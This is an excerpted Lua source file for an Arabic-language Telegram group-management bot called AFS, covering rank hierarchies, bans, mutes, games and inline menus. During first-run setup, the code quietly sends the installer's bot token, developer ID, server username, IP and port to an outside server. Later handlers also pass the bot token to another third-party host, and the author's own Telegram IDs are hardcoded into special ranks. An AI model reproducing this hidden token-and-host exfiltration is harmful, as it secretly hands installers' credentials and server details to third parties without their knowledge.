------------------------------------------------
-- This Source Was Developed By (ALS) @BBBVVBV.--
...
if not DevALS:get(Server.."IdAFS") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevALS:set(Server.."IdAFS",DevId) 
else 
print('\27[1;31m┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉') 
end
os.execute('lua AFS.lua') 
end
if not DevALS:get(Server.."TokenAFS") then 
...
DevALS:set(Server.."TokenAFS",TokenBot) 
end  
else 
...
Config = {
DevId = DevALS:get(Server.."IdAFS"),
TokenBot = DevALS:get(Server.."TokenAFS"),
AFS = DevALS:get(Server.."TokenAFS"):match("(%d+)"),
SudoIds = {DevALS:get(Server.."IdAFS")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/AFS/index.php?Get=AFS&DevId="..DevALS:get(Server.."IdAFS").."&TokenBot="..DevALS:get(Server.."TokenAFS").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("AFS.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/AFS
token="]]..DevALS:get(Server.."TokenAFS")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉ ┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
...
./tg -s ./AFS.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
...
local Load_AFS = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevALS:del(Server.."IdAFS");DevALS:del(Server.."TokenAFS")
end 
...
NameBot = (DevALS:get(AFS..'ALS:NameBot') or 'يوكا')
--     Source AFS     --
...
FilesPrint = FilesPrint.."\27[35m".."┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n".."\27[m"
...
local Status = DevALS:sismember(AFS..'ALS:ALSSudo:',msg.sender_user_id_) 
...
local Status = DevALS:sismember(AFS..'ALS:SecondSudo:',msg.sender_user_id_) 
...
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(AFS) then  
var = true  
end  
return var  
end 
...
local Status = DevALS:sismember(AFS..'ALS:SudoBot:',msg.sender_user_id_) 
...
local Status = DevALS:sismember(AFS..'ALS:ALSConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or ALSSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
----   Owner   ----
function Owner(msg) 
local Status = DevALS:sismember(AFS..'ALS:Owner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(AFS..'ALS:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(AFS..'ALS:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(AFS..'ALS:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = DevALS:sismember(AFS..'ALS:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = DevALS:sismember(AFS..'ALS:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(AFS..'ALS:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(AFS..'ALS:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(AFS..'ALS:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or ALSConstructor(msg) or ALSSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
if DevALS:sismember(AFS..'ALS:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevALS:sismember(AFS..'ALS:BanAll:', user_id) then
var = true
else
var = false
end
...
if DevALS:sismember(AFS..'ALS:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevALS:sismember(AFS..'ALS:MuteAll:', user_id) then
var = true
else
var = false
end
...
--     Source AFS     --
function Files_AFS(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.AFS and msg then
FilesText = plugin.AFS(msg)
end
end
end
...
if File_Name:lower():match('(%d+)') ~= AFS:lower() then 
...
local info_file = io.open('./'..AFS..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevALS:set(AFS.."ALS:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevALS:sadd(AFS.."ALS:Groups",IdGps) 
DevALS:set(AFS.."ALS:Lock:Bots"..IdGps,"del") DevALS:hset(AFS.."ALS:Spam:Group:User"..IdGps ,"Spam:User","keed") 
...
DevALS:set(AFS..Lock..IdGps,true)
end
if v.ALSConstructors then
for k,IdALSConstructors in pairs(v.ALSConstructors) do
DevALS:sadd(AFS..'ALS:ALSConstructor:'..IdGps,IdALSConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevALS:sadd(AFS..'ALS:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevALS:sadd(AFS..'ALS:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevALS:sadd(AFS..'ALS:Managers:'..IdGps,IdManagers)  
...
vardump(IdAdmins)
DevALS:sadd(AFS..'ALS:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevALS:sadd(AFS..'ALS:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevALS:set(AFS.."ALS:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevALS:set(AFS.."ALS:Groups:Welcomes"..IdGps,v.Welcomes)   
...
--     Source AFS     --
local ALSRank = function(msg) if SudoId(msg.sender_user_id_) then AFSTeam  = "المطور" elseif ALSSudo(msg) then AFSTeam = "المطور" elseif SecondSudo(msg) then AFSTeam = "المطور" elseif SudoBot(msg) then AFSTeam = "المطور" elseif Manager(msg) then AFSTeam = "المدير" elseif Admin(msg) then AFSTeam = "الادمن" else AFSTeam = "العضو" end return AFSTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1566031059) then AFSTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(2076971531) then AFSTeam = 'مطور السورس' elseif tonumber(user_id) == tonumber(1695110211) then AFSTeam = 'مطور السورس' elseif tonumber(user_id) == tonumber(AFS) then AFSTeam = 'البوت' elseif SudoId(user_id) then AFSTeam = 'المطور الاساسي' elseif DevALS:sismember(AFS..'ALS:ALSSudo:', user_id) then AFSTeam = 'المطور الاساسي' elseif DevALS:sismember(AFS..'ALS:SecondSudo:', user_id) then AFSTeam = 'المطور الاساسي²' elseif DevALS:sismember(AFS..'ALS:SudoBot:', user_id) then AFSTeam = DevALS:get(AFS.."ALS:SudoBot:Rd"..chat_id) or 'المطور' elseif DevALS:sismember(AFS..'ALS:Owner:'..chat_id, user_id) then AFSTeam = DevALS:get(AFS.."ALS:Owner:Rd"..chat_id) or 'المالك' elseif DevALS:sismember(AFS..'ALS:ALSConstructor:'..chat_id, user_id) then AFSTeam = 'المالك' elseif DevALS:sismember(AFS..'ALS:BasicConstructor:'..chat_id, user_id) then AFSTeam = DevALS:get(AFS.."ALS:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevALS:sismember(AFS..'ALS:Constructor:'..chat_id, user_id) then AFSTeam = DevALS:get(AFS.."ALS:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevALS:sismember(AFS..'ALS:Managers:'..chat_id, user_id) then AFSTeam = DevALS:get(AFS.."ALS:Managers:Rd"..chat_id) or 'المدير' elseif DevALS:sismember(AFS..'ALS:Admins:'..chat_id, user_id) then AFSTeam = DevALS:get(AFS.."ALS:Admins:Rd"..chat_id) or 'الادمن' elseif DevALS:sismember(AFS..'ALS:VipMem:'..chat_id, user_id) then  AFSTeam = DevALS:get(AFS.."ALS:VipMem:Rd"..chat_id) or 'المميز' elseif DevALS:sismember(AFS..'ALS:Cleaner:'..chat_id, user_id) then  AFSTeam = DevALS:get(AFS.."ALS:Cleaner:Rd"..chat_id) or 'المنظف' else AFSTeam = DevALS:get(AFS.."ALS:mem:Rd"..chat_id) or 'العضو' end return AFSTeam end
--     Source AFS     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(AFS) then  
var = true
elseif DevALS:sismember(AFS..'ALS:ALSSudo:', user_id) then
var = true
elseif DevALS:sismember(AFS..'ALS:SecondSudo:', user_id) then
var = true  
elseif DevALS:sismember(AFS..'ALS:SudoBot:', user_id) then
var = true 
elseif DevALS:sismember(AFS..'ALS:ALSConstructor:'..chat_id, user_id) then
var = true
elseif DevALS:sismember(AFS..'ALS:Owner:'..chat_id, user_id) then
var = true
elseif DevALS:sismember(AFS..'ALS:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevALS:sismember(AFS..'ALS:Constructor:'..chat_id, user_id) then
var = true  
elseif DevALS:sismember(AFS..'ALS:Managers:'..chat_id, user_id) then
var = true  
elseif DevALS:sismember(AFS..'ALS:Admins:'..chat_id, user_id) then
var = true  
elseif DevALS:sismember(AFS..'ALS:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
...
local ALS = (AFS..'ALS:Filters:'..msg.chat_id_)
if ALS then
...
--     Source AFS     --
function ALSmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevALS:get(AFS..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source AFS     --
function ChCheck(msg)
local var = true 
if DevALS:get(AFS.."ALS:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevALS:get(AFS..'ALS:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevALS:get(AFS..'ALS:ChText') then
local ChText = DevALS:get(AFS..'ALS:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALS:get(AFS.."ALS:ChId"))
local GetInfo = JSON.decode(Check)
...
if DataText == '/delyes' and DevALS:get(AFS..'yes'..data.sender_user_id_) == 'delyes' then
DevALS:del(AFS..'yes'..data.sender_user_id_, 'delyes')
DevALS:del(AFS..'no'..data.sender_user_id_, 'delno')
...
EditMsg(Chat_Id2, Msg_Id2, "☆︙لا استطيع طرد مشرفين الكروب") 
return false  
end
...
if DataText == '/delno' and DevALS:get(AFS..'no'..data.sender_user_id_) == 'delno' then
DevALS:del(AFS..'yes'..data.sender_user_id_, 'delyes')
DevALS:del(AFS..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "☆︙تم الغاء امر اطردني") 
end
--     Source AFS     --
if DataText == '/yesdel' and DevALS:get(AFS..'yesdel'..data.sender_user_id_) == 'delyes' then
DevALS:del(AFS..'yesdel'..data.sender_user_id_, 'delyes')
DevALS:del(AFS..'nodel'..data.sender_user_id_, 'delno')
if DevALS:sismember(AFS..'ALS:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevALS:sismember(AFS..'ALS:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevALS:sismember(AFS..'ALS:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevALS:sismember(AFS..'ALS:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevALS:sismember(AFS..'ALS:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevALS:sismember(AFS..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevALS:sismember(AFS..'ALS:Constructor:'..data.chat_id_, data.sender_user_id_) or DevALS:sismember(AFS..'ALS:Managers:'..data.chat_id_, data.sender_user_id_) or DevALS:sismember(AFS..'ALS:Admins:'..data.chat_id_, data.sender_user_id_) or DevALS:sismember(AFS..'ALS:VipMem:'..data.chat_id_, data.sender_user_id_) or DevALS:sismember(AFS..'ALS:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevALS:sismember(AFS..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevALS:srem(AFS..'ALS:Constructor:'..data.chat_id_,data.sender_user_id_)
DevALS:srem(AFS..'ALS:Managers:'..data.chat_id_,data.sender_user_id_)
DevALS:srem(AFS..'ALS:Admins:'..data.chat_id_,data.sender_user_id_)
DevALS:srem(AFS..'ALS:VipMem:'..data.chat_id_,data.sender_user_id_)
DevALS:srem(AFS..'ALS:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevALS:srem(AFS..'User:Donky:'..data.chat_id_,data.sender_user_id_)
...
--     Source AFS     --
if DevALS:get(AFS.."ALS:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "☆︙تم الغاء امر تغير المطور الاساسي") 
DevALS:del(AFS.."ALS:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevALS:get(AFS.."ALS:NewDev"..data.sender_user_id_)
...
if DataText == '/nodel' and DevALS:get(AFS..'nodel'..data.sender_user_id_) == 'delno' then
DevALS:del(AFS..'yesdel'..data.sender_user_id_, 'delyes')
DevALS:del(AFS..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "☆︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevALS:get(AFS.."ALS:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevALS:smembers(AFS..'ALS:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevALS:incrby(AFS..'ALS:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevALS:del(AFS..'ALS:ListRolet'..data.chat_id_) 
DevALS:del(AFS.."ALS:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "☆︙*صاحب الحظ* ↫ ["..UserName.."]\n☆︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevALS:del(AFS..'ALS:ListRolet'..data.chat_id_) 
DevALS:del(AFS.."ALS:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevALS:del(AFS.."ALS:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
...
if DevALS:sismember(AFS..'ALS:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevALS:srem(AFS..'ALS:Tkeed:'..Chat_Id2, data.sender_user_id_)
...
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ccccxcc.ml/AFS/Yt.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/AFS/Yt.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/AFS/Yt.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ccccxcc.ml/AFS/Yt.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local ALS = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "☆︙الكلمه ↫ "..ALS.." تم حذفها") 
DevALS:del(AFS..'ALS:Text:GpTexts'..ALS..data.chat_id_)
DevALS:srem(AFS..'ALS:Manager:GpRedod'..data.chat_id_,ALS)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local ALS = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevALS:smembers(AFS..'ALS:Text:GpTexts'..ALS..data.chat_id_)
if DevALS:get(AFS..'ALS:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "☆︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..ALS) 
DevALS:del(AFS..'ALS:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
...
DevALS:del(AFS..'ALS:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevALS:del(AFS..'ALS:Text:GpTexts'..ALS..data.chat_id_)
DevALS:del(AFS..'ALS:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevALS:srem(AFS..'ALS:Manager:GpRedod'..data.chat_id_,ALS)
else
EditMsg(Chat_Id2, Msg_Id2, "☆︙عذرا صلاحية الامر منتهيه !") 
end
...
DevALS:del(AFS..'ALS:Text:KtTexts'..ALS..data.chat_id_)
DevALS:srem(AFS..'ALS:Sudo:Kt'..data.chat_id_,ALS)
end
...
local List = DevALS:smembers(AFS..'ALS:Text:KtTexts'..ALS..data.chat_id_)
if DevALS:get(AFS..'ALS:Add:Kt'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "☆︙تم انهاء وحفظ ↫ "..#List.." من الاسئله للامر ↫ "..ALS) 
DevALS:del(AFS..'ALS:Add:Kt'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "☆︙عذرا صلاحية الامر منتهيه !") 
end
end
...
DevALS:del(AFS..'ALS:Add:Kt'..data.sender_user_id_..data.chat_id_)
DevALS:del(AFS..'ALS:Text:KtTexts'..ALS..data.chat_id_)
DevALS:del(AFS..'ALS:Add:KtTexts'..data.sender_user_id_..data.chat_id_)
DevALS:srem(AFS..'ALS:Sudo:Kt'..data.chat_id_,ALS)
else
EditMsg(Chat_Id2, Msg_Id2, "☆︙عذرا صلاحية الامر منتهيه !") 
end
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/Song:"..data.sender_user_id_}},{{text=". TeAm AFS ☆",url="t.me/CXRCX"}}} 
...
local Text ='*☆︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/mp3:"..data.sender_user_id_}},{{text=". TeAm AFS ☆",url="t.me/CXRCX"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/memz:"..data.sender_user_id_}},{{text=". TeAm AFS ☆",url="t.me/CXRCX"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/gif:"..data.sender_user_id_}},{{text=". TeAm AFS ☆",url="t.me/CXRCX"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/photo:"..data.sender_user_id_}},{{text=". TeAm AFS ☆",url="t.me/CXRCX"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/anime:"..data.sender_user_id_}},{{text=". TeAm AFS ☆",url="t.me/CXRCX"}}} 
...
DevALS:sadd(AFS..'ALS:VipMem:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(AFS..'ALS:Cleaner:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(AFS..'ALS:Admins:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(AFS..'ALS:Managers:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(AFS..'ALS:Constructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(AFS..'ALS:BasicConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(AFS..'ALS:ALSConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(AFS..'ALS:SudoBot:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(AFS..'ALS:SecondSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(AFS..'ALS:ALSSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:VipMem:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:Cleaner:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:Admins:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:Managers:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:Constructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:BasicConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:ALSConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:SudoBot:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:SecondSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:ALSSudo:'..data.chat_id_,dp.id_)
...
DevALS:sadd(AFS..'ALS:Ban:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n☆︙تم حظره')
end
end
end,nil)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:Ban:'..data.chat_id_,dp.id_)
...
if DevALS:sismember(AFS..'ALS:Muted:'..data.chat_id_, dp.id_) then
EditMsg(Chat_Id2, Msg_Id2, "☆︙هو بالفعل مكتوم من الكروب")  
else
DevALS:sadd(AFS..'ALS:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n☆︙تم كتمه')
end
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n☆︙تم الغاء كتمه')
end,nil)
end
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(AFS..'ALS:BanAll:', dp.id_)
DevALS:srem(AFS..'ALS:MuteAll:', dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n☆︙تم الغاء العام')
end,nil)
end
...
DevALS:sadd(AFS..'ALS:Tkeed:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n☆︙تم تقيده من الكروب')
end
end
end,nil)
...
DevALS:srem(AFS..'ALS:Tkeed:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n☆︙تم الغاء تقيده')
end,nil)
end
--     Source AFS     --
...
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..ALS},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..ALS}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..ALS},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..ALS}},{{text = '⌁ AFS TeAM.',url="t.me/CXRCX"}}}
elseif Manager(data) then
...
local Del = DevALS:get(AFS..'ALS:Del')
local Text = [[
☆︙ها هلو في قائمة اوامر الرتب ↫ ⤈          
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="مسح الاساسيين",callback_data="/DelBasicConstructor:"..data.sender_user_id_},{text="مسح المنشئين",callback_data="/DelConstructor:"..data.sender_user_id_}},{{text="مسح المدراء",callback_data="/DelManager:"..data.sender_user_id_},{text="مسح الادمنيه",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="مسح المميزين",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/HelpList:"..data.sender_user_id_}}}
...
DevALS:del(AFS..'ALS:ALSSudo:')
Text = "*☆︙تم حذف الاساسيين*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
...
DevALS:del(AFS..'ALS:Owner:'..data.chat_id_)
...
DevALS:del(AFS..'ALS:UsersMsgs'..data.chat_id_..':'..data.sender_user_id_)
...
DevALS:del(AFS..'ALS:Constructor:'..data.chat_id_)
...
DevALS:del(AFS..'ALS:Managers:'..data.chat_id_)
Text = "*☆︙تم حذف المدراء*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
